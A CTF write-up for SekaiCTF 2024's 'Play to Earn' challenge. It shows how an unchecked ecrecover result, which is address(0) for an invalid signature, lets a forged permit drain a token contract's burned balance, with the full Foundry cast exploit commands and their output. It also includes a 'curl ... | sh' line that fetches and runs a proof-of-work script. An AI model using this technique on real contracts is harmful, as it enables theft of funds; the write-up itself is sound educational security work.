---
title: "Play to Earn - SekaiCTF 2024"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["blockchain", "solidity", "foundry", "proof-of-work", "pivoting", "play", "earn", "smart-contract", "sekaictf", "sekaictf-2024", "2024", "ctf-writeup"]
summary: "We are given a Smart Contract called ArcadeMachine.sol:"
source:
  name: "CTFtime writeup #39409"
  url: "https://ctftime.org/writeup/39409"
original_source: "https://7rocky.github.io/en/ctf/other/sekaictf/play-to-earn/"
ctf:
  name: "SekaiCTF 2024"
  year: 2024
  challenge: "Play to Earn"
---

## Metadata

- **CTF:** SekaiCTF 2024
- **Task:** Play to Earn
- **Author team:** ICAI Cyber Team
- **CTFtime:** <https://ctftime.org/writeup/39409>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/sekaictf/play-to-earn/>

---
We are given a Smart Contract called `ArcadeMachine.sol`:

`

```
    pragma solidity 0.8.25;
    
    import { Coin } from "./Coin.sol";
    
    contract ArcadeMachine {
    
        Coin coin;
    
        constructor(Coin _coin) {
            coin = _coin;
        }
    
        function play(uint256 times) external {
            // burn the coins
            require(coin.transferFrom(msg.sender, address(0), 1 ether * times));
            // Have fun XD
        }
    
    }
```

`

Another Smart Contract called `Coin.sol`:

`

```
    pragma solidity 0.8.25;
    
    import "@openzeppelin/contracts/access/Ownable.sol";
    import "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
    
    contract Coin is Ownable, EIP712 {
        string public constant name     = "COIN";
        string public constant symbol   = "COIN";
        uint8  public constant decimals = 18;
        bytes32 constant PERMIT_TYPEHASH = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );
    
        event  Approval(address indexed src, address indexed guy, uint wad);
        event  Transfer(address indexed src, address indexed dst, uint wad);
        event  Deposit(address indexed dst, uint wad);
        event  Withdrawal(address indexed src, uint wad);
        event  PrivilegedWithdrawal(address indexed src, uint wad);
    
        mapping (address => uint)                       public  nonces;
        mapping (address => uint)                       public  balanceOf;
        mapping (address => mapping (address => uint))  public  allowance;
    
        constructor() Ownable(msg.sender) EIP712(name, "1") {}
    
        fallback() external payable {
            deposit();
        }
    
        function deposit() public payable {
            balanceOf[msg.sender] += msg.value;
            emit Deposit(msg.sender, msg.value);
        }
    
        function withdraw(uint wad) external {
            require(balanceOf[msg.sender] >= wad);
            balanceOf[msg.sender] -= wad;
            payable(msg.sender).transfer(wad);
            emit Withdrawal(msg.sender, wad);
        }
    
        function privilegedWithdraw() onlyOwner external {
            uint wad = balanceOf[address(0)];
            balanceOf[address(0)] = 0;
            payable(msg.sender).transfer(wad);
            emit PrivilegedWithdrawal(msg.sender, wad);
        }
    
        function totalSupply() public view returns (uint) {
            return address(this).balance;
        }
    
        function approve(address guy, uint wad) public returns (bool) {
            allowance[msg.sender][guy] = wad;
            emit Approval(msg.sender, guy, wad);
            return true;
        }
    
        function permit(
            address owner,
            address spender,
            uint256 value,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external {
            require(block.timestamp <= deadline, "signature expired");
            bytes32 structHash = keccak256(
                abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)
            );
            bytes32 h = _hashTypedDataV4(structHash);
            address signer = ecrecover(h, v, r, s);
            require(signer == owner, "invalid signer");
            allowance[owner][spender] = value;
            emit Approval(owner, spender, value);
        }
    
        function transfer(address dst, uint wad) public returns (bool) {
            return transferFrom(msg.sender, dst, wad);
        }
    
        function transferFrom(address src, address dst, uint wad)
            public
            returns (bool)
        {
            require(balanceOf[src] >= wad);
    
            if (src != msg.sender && allowance[src][msg.sender] != type(uint256).max) {
                require(allowance[src][msg.sender] >= wad);
                allowance[src][msg.sender] -= wad;
            }
    
            balanceOf[src] -= wad;
            balanceOf[dst] += wad;
    
            emit Transfer(src, dst, wad);
    
            return true;
        }
    }
```

`

And this is `Setup.sol`:

`

```
    pragma solidity 0.8.25;
    
    import { Coin } from "./Coin.sol";
    import { ArcadeMachine } from "./ArcadeMachine.sol";
    
    contract Setup {
    
        Coin public coin;
        ArcadeMachine public arcadeMachine;
    
        address player;
    
        constructor() payable {
            coin = new Coin();
            arcadeMachine = new ArcadeMachine(coin);
    
            // Assume that many people have played before you ;)
            require(msg.value == 20 ether);
            coin.deposit{value: 20 ether}();
            coin.approve(address(arcadeMachine), 19 ether);
            arcadeMachine.play(19);
        }
    
        function register() external {
            require(player == address(0));
            player = msg.sender;
            coin.transfer(msg.sender, 1337);    // free coins for new players :)
        }
    
        function isSolved() external view returns (bool) {
            return player != address(0) && player.balance >= 13.37 ether;
        }
    }
```

`

## Setup environment

First of all, let’s save the connection parameters as shell variables:

`

```
    $ ncat --ssl play-to-earn.chals.sekai.team 1337
    1 - launch new instance
    2 - kill instance
    3 - get flag
    action? 1
    curl -sSfL https://pwn.red/pow | sh -s s.AAATiA==.lBVBVVO53vx7N8dUODddBQ==
    solution please: s.BFE2GqrKKFhmj7+6mKbW2pD9nFKsOCXgE4LrOdhtf6BJu6uZVVZUpgWQ7h6h083wh5tlnLAQukyir0tXOFAaX39O3MNsiY30lnzu/xecGdcLLozR8p0iYc1OeF0+wwG/kHl8kG9JIhsnsaAo3SdLAObhNhPLRIySTlE7qOrl9p6L/KD0SvRXXMxTviF7dMnDUIqU19JInoNCi8+JHKmt7Q==
    
    your private blockchain has been deployed
    it will automatically terminate in 30 minutes
    here's some useful information
    uuid:           decbdee7-b83f-4597-8390-a817c2d9498b
    rpc endpoint:   https://play-to-earn.chals.sekai.team/decbdee7-b83f-4597-8390-a817c2d9498b
    private key:    0x6351128ac11d06dc0e3c714e594994f432f324fe317078bfca64a117fad0e001
    your address:   0xcA75Bb843EFC2fC19941B57BB2DbFAa0d889109c
    setup contract: 0x2A94c6147f15cE2f4C92EeEFabc9b471020b8Fe1
    
    
    Ncat: Input/output error.
    
    $ export ETH_RPC_URL='https://play-to-earn.chals.sekai.team/decbdee7-b83f-4597-8390-a817c2d9498b'
    
    $ PRIVATE_KEY='0x6351128ac11d06dc0e3c714e594994f432f324fe317078bfca64a117fad0e001'
    
    $ ADDRESS='0xcA75Bb843EFC2fC19941B57BB2DbFAa0d889109c'
    
    $ ADDRESS_SETUP='0x2A94c6147f15cE2f4C92EeEFabc9b471020b8Fe1'
    
    $ cast call $ADDRESS_SETUP 'isSolved() (bool)'
    false
```

`

## Solution

As can be seen in `Setup.sol`, we need that our `player` address is defined and to have more than 13.37 ether as balance. The first part is easy, we only need to call `register`. For the second part, we will need to analyze the `Coin` Smart Contract.

One thing we can do is get the addresses of `coin` and `arcadeMachine`, either from the storage or calling the public methods:

`

```
    $ cast storage $ADDRESS_SETUP 0
    0x000000000000000000000000c1c44b2a3f7ec00cc91646c62dc21ad74b90f85c
    
    $ cast storage $ADDRESS_SETUP 1
    0x00000000000000000000000077c92b748aa2ff38542d7d667a6c34afff1c2c86
    
    $ cast storage $ADDRESS_SETUP 2
    0x0000000000000000000000000000000000000000000000000000000000000000
    
    $ cast call $ADDRESS_SETUP 'coin() (address)'
    0xc1c44b2A3f7eC00cc91646C62dC21aD74B90f85c
    
    $ cast call $ADDRESS_SETUP 'arcadeMachine() (address)'
    0x77C92B748aA2ff38542D7d667a6C34aFff1c2c86
    
    $ ADDRESS_COIN=$(cast call $ADDRESS_SETUP 'coin() (address)')
    
    $ ADDRESS_ARCADE_MACHINE=$(cast call $ADDRESS_SETUP 'arcadeMachine() (address)')
```

`

Notice how the `player` address (storage index 2) is still not defined.

This Smart Contract defines some `nonces`, `balanceOf` and `allowance` mappings to handle money transfers:

`

```
        mapping (address => uint)                       public  nonces;
        mapping (address => uint)                       public  balanceOf;
        mapping (address => mapping (address => uint))  public  allowance;
```

`

In fact, the only thing that `ArcadeMachine` does is transfer 19 ether to `address(0)` (called from `Setup`):

`

```
        constructor(Coin _coin) {
            coin = _coin;
        }
    
        function play(uint256 times) external {
            // burn the coins
            require(coin.transferFrom(msg.sender, address(0), 1 ether * times));
            // Have fun XD
        }
```

`

This means that `address(0)` has 19 ether as balance:

`

```
    $ cast call $ADDRESS_COIN 'balanceOf(address) (uint)' 0x0000000000000000000000000000000000000000
    19000000000000000000
```

`

Apart from `approve`:

`

```
        function approve(address guy, uint wad) public returns (bool) {
            allowance[msg.sender][guy] = wad;
            emit Approval(msg.sender, guy, wad);
            return true;
        }
```

`

Which simply sets `allowance` of money from the sender’s address to another address, we have a similar method to do almost the same, which is `permit`:

`

```
        function permit(
            address owner,
            address spender,
            uint256 value,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external {
            require(block.timestamp <= deadline, "signature expired");
            bytes32 structHash = keccak256(
                abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)
            );
            bytes32 h = _hashTypedDataV4(structHash);
            address signer = ecrecover(h, v, r, s);
            require(signer == owner, "invalid signer");
            allowance[owner][spender] = value;
            emit Approval(owner, spender, value);
        }
```

`

In this function, we can provide the source address for the `allowance` mapping, but we need to provide a valid signature for that, because it is checked with `ecrecover`:

`

```
            address signer = ecrecover(h, v, r, s);
            require(signer == owner, "invalid signer");
            allowance[owner][spender] = value;
```

`

However, according to [the docs](https://docs.soliditylang.org/en/latest/cheatsheet.html#mathematical-and-cryptographic-functions), `ecrecover` will output `address(0)` on error. We can check it using `chisel`:

`

```
    $ chisel
    Welcome to Chisel! Type `!help` to show available commands.
    ➜ ecrecover(0, 0, 0, 0)
    Type: address
    └ Data: 0x0000000000000000000000000000000000000000
```

`

So, we can send arbitrary values `v`, `r`, `s` for the signature to get `address(0)` as output. Also, we need to send a large number as `deadline` to pass this `require` check. As a result, we can set `allowance` to send us the money:

`

```
    $ cast call $ADDRESS_COIN 'allowance(address, address) (uint)' 0x0000000000000000000000000000000000000000 $ADDRESS
    0
    
    $ cast send $ADDRESS_COIN 'permit(address, address, uint256, uint256, uint8, bytes32, bytes32)' 0x0000000000000000000000000000000000000000 $ADDRESS 19000000000000000000 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 0 0x0 0x0 --private-key $PRIVATE_KEY
    
    blockHash               0x392e0a2c8dd6c8a23b2a111bc2b6478c70d214839d9ba5d431703f84f82bb0d8
    blockNumber             3
    contractAddress
    cumulativeGasUsed       73634
    effectiveGasPrice       3000000000
    gasUsed                 73634
    logs                    [{"address":"0xc1c44b2a3f7ec00cc91646c62dc21ad74b90f85c","topics":["0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925","0x0000000000000000000000000000000000000000000000000000000000000000","0x000000000000000000000000ca75bb843efc2fc19941b57bb2dbfaa0d889109c"],"data":"0x00000000000000000000000000000000000000000000000107ad8f556c6c0000","blockHash":"0x392e0a2c8dd6c8a23b2a111bc2b6478c70d214839d9ba5d431703f84f82bb0d8","blockNumber":"0x3","transactionHash":"0xb3a576d0678603bcfb33e2e50a2285872272e115d93c083d53593bd1948a543e","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000002000000000000000020000000000000000000800000000000800000004000000004000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000002000000000000008000000000000000000000000000000000000000000000020000010000000000000000000000000000000000000000000000000000000000000
    root                    0x727d6d1aacf37d2e058e0441737b91a935d31d20418394741fcbe6bbf3f5013c
    status                  1
    transactionHash         0xb3a576d0678603bcfb33e2e50a2285872272e115d93c083d53593bd1948a543e
    transactionIndex        0
    type                    2
    
    $ cast call $ADDRESS_COIN 'allowance(address, address) (uint)' 0x0000000000000000000000000000000000000000 $ADDRESS
    19000000000000000000
```

`

With this, we can use `transferFrom` to get the money:

`

```
        function transferFrom(address src, address dst, uint wad)
            public
            returns (bool)
        {
            require(balanceOf[src] >= wad);
    
            if (src != msg.sender && allowance[src][msg.sender] != type(uint256).max) {
                require(allowance[src][msg.sender] >= wad);
                allowance[src][msg.sender] -= wad;
            }
    
            balanceOf[src] -= wad;
            balanceOf[dst] += wad;
    
            emit Transfer(src, dst, wad);
    
            return true;
        }
```

`

`

```
    $ cast call $ADDRESS_COIN 'balanceOf(address) (uint)' $ADDRESS
    0
    
    $ cast send $ADDRESS_COIN 'transferFrom(address, address, uint)' 0x0000000000000000000000000000000000000000 $ADDRESS 19000000000000000000 --private-key $PRIVATE_KEY
    
    blockHash               0x44fd7ebd12282e63e951a0bc4d17f7e72ca5be787dcf90846713ca6a6e0b36ec
    blockNumber             4
    contractAddress
    cumulativeGasUsed       48198
    effectiveGasPrice       3000000000
    gasUsed                 48198
    logs                    [{"address":"0xc1c44b2a3f7ec00cc91646c62dc21ad74b90f85c","topics":["0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef","0x0000000000000000000000000000000000000000000000000000000000000000","0x000000000000000000000000ca75bb843efc2fc19941b57bb2dbfaa0d889109c"],"data":"0x00000000000000000000000000000000000000000000000107ad8f556c6c0000","blockHash":"0x44fd7ebd12282e63e951a0bc4d17f7e72ca5be787dcf90846713ca6a6e0b36ec","blockNumber":"0x4","transactionHash":"0x1221741eb7587b4ba48180f0addd7597be78dd879b51ff3e8491c318462b7ff9","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000002000000000000000020000000000000000000800000000000800000004000010004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000002000008000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000
    root                    0x66d26901ad1e4aa8f45a69ac0a4c9f1b049afe468836fc3e5b89052d66f6b9f3
    status                  1
    transactionHash         0x1221741eb7587b4ba48180f0addd7597be78dd879b51ff3e8491c318462b7ff9
    transactionIndex        0
    type                    2
    
    $ cast call $ADDRESS_COIN 'balanceOf(address) (uint)' $ADDRESS
    19000000000000000000
```

`

Now, we can register the player in `Setup`:

`

```
    $ cast storage $ADDRESS_SETUP 2
    0x0000000000000000000000000000000000000000000000000000000000000000
    
    $ cast send $ADDRESS_SETUP 'register()' --private-key $PRIVATE_KEY
    
    blockHash               0xfa794e74386154f46418b4b88ed2b109c3d7de35e132d2d7ab11672f49839273
    blockNumber             6
    contractAddress
    cumulativeGasUsed       61572
    effectiveGasPrice       3000000000
    gasUsed                 61572
    logs                    [{"address":"0xc1c44b2a3f7ec00cc91646c62dc21ad74b90f85c","topics":["0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef","0x0000000000000000000000002a94c6147f15ce2f4c92eeefabc9b471020b8fe1","0x000000000000000000000000ca75bb843efc2fc19941b57bb2dbfaa0d889109c"],"data":"0x0000000000000000000000000000000000000000000000000000000000000539","blockHash":"0xfa794e74386154f46418b4b88ed2b109c3d7de35e132d2d7ab11672f49839273","blockNumber":"0x6","transactionHash":"0x23cbc12fdd31cf4d6ba1474603156afedadc2a4355ee747fb64cce7bf00c17a5","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000002000000000000000000000000000000000000000000000000800000004800010004000000020000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000002000000002000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root                    0x710f59649049ad45942e6a28ca4b44652f0f317b86f73e4cadf64865b11edfae
    status                  1
    transactionHash         0x23cbc12fdd31cf4d6ba1474603156afedadc2a4355ee747fb64cce7bf00c17a5
    transactionIndex        0
    type                    2
    
    $ cast storage $ADDRESS_SETUP 2
    0x000000000000000000000000ca75bb843efc2fc19941b57bb2dbfaa0d889109c
    
    $ echo $ADDRESS
    0xcA75Bb843EFC2fC19941B57BB2DbFAa0d889109c
```

`

Finally, we withdraw some money from `Coin` to solve the challenge:

`

```
    $ cast send $ADDRESS_COIN 'withdraw(uint)' 19000000000000000000 --private-key $PRIVATE_KEY
    
    blockHash               0xa57f09bd138c32f2243afb0ded05b25417db0a19e0b6bf61139b005babe052c7
    blockNumber             7
    contractAddress
    cumulativeGasUsed       35211
    effectiveGasPrice       3000000000
    gasUsed                 35211
    logs                    [{"address":"0xc1c44b2a3f7ec00cc91646c62dc21ad74b90f85c","topics":["0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65","0x000000000000000000000000ca75bb843efc2fc19941b57bb2dbfaa0d889109c"],"data":"0x00000000000000000000000000000000000000000000000107ad8f556c6c0000","blockHash":"0xa57f09bd138c32f2243afb0ded05b25417db0a19e0b6bf61139b005babe052c7","blockNumber":"0x7","transactionHash":"0x2e6f513c2145cf865796600b7acd155955cfea2d515da3590e9f1a557a142259","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000002000000000000000000000000000000000000000000000000800040004000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000008000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000
    root                    0x07943ff4ad081b92e626050d5701d6471ca174a7d8d3b7bffc63bf13c46edd20
    status                  1
    transactionHash         0x2e6f513c2145cf865796600b7acd155955cfea2d515da3590e9f1a557a142259
    transactionIndex        0
    type                    2
    
    $ cast balance $ADDRESS --ether
    19.999273799000000000
```

`

## Flag

Once here, we have solved the challenge and we can get the flag:

`

```
    $ cast call $ADDRESS_SETUP 'isSolved() (bool)'
    true
    
    $ ncat --ssl play-to-earn.chals.sekai.team 1337
    1 - launch new instance
    2 - kill instance
    3 - get flag
    action? 3
    uuid please: decbdee7-b83f-4597-8390-a817c2d9498b
    SEKAI{0wn3r:wh3r3_4r3_mY_c01n5_:<}
```

`
